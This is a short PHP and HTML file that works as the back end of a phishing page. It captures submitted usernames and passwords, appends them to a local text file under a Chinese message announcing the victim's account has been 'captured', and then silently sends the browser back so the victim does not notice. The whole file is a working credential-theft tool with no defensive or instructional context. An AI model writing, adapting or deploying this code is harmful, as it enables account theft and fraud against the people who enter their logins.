<?php
$nam=stripslashes($_POST['username']);
$pas=stripslashes($_POST['password']);
$content="您已捕获对方的账号及其密码：" . "用户名" . $nam. "邮箱" . $pas;
$filed=@fopen("1.txt","a+");
	@fwrite($filed,"$content\n");
?>
<html>
<head>
	<script type="text/javascript">
		function goBack()
		{
		
			window.history.back()
			
		}
		</script>
</head>
<body onload="goBack()">
</boby>
</html>